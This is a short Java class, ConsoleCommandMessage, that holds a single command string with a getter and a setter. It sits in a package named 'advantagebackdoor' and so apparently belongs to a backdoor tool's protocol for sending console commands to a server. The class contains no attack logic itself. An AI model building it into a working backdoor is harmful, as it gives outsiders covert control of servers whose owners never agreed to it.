package me.faintcloudy.advantagebackdoor.api.message.play.server;

import me.faintcloudy.advantagebackdoor.api.message.SimpleNetworkMessage;

public class ConsoleCommandMessage extends SimpleNetworkMessage {
    private String command;

    public ConsoleCommandMessage(String command)
    {
        this.command = command;
    }

    public ConsoleCommandMessage() {}

    public String getCommand() {
        return command;
    }

    public void setCommand(String command) {
        this.command = command;
    }
}
